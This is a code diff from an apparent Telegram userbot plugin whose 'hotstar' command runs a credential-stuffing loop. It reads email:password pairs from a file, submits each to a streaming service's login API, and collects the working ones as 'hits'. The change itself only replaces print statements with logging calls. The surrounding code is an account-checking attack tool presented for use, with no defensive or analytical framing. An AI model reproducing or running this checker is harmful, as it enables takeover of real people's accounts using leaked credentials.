@@ -28,7 +28,7 @@ async def hotstar(event):
     lines = file.readlines()
     for line in lines:
         stark_dict.append(line)
-    print(stark_dict)
+    logger.info(stark_dict)
     for i in stark_dict:
         starkm = i.split(":")
         email = starkm[0]
@@ -38,7 +38,7 @@ async def hotstar(event):
         payload = {"isProfileRequired":"false","userData":{"deviceId":"a7d1bc04-f55e-4b16-80e8-d8fbf4c91768","password":password,"username":email,"usertype":"email"}}
         try:
             meke = requests.post(url, data=json.dumps(payload), headers=headers)
-            print(f"{meke.text} {int(meke.status_code)}")
+            logger.info(f"{meke.text} {int(meke.status_code)}")
         except Exception as s:
             await event.edit("**Errors : **" + str(s))
             return
@@ -47,7 +47,7 @@ async def hotstar(event):
             hits_dict.append(f"{email}:{password}")
         else:
             bads += 1
-    print(hits_dict)
+    logger.info(hits_dict)
     if len(hits_dict) == 0:
         await event.edit("No Hits " + meke.text)
         return
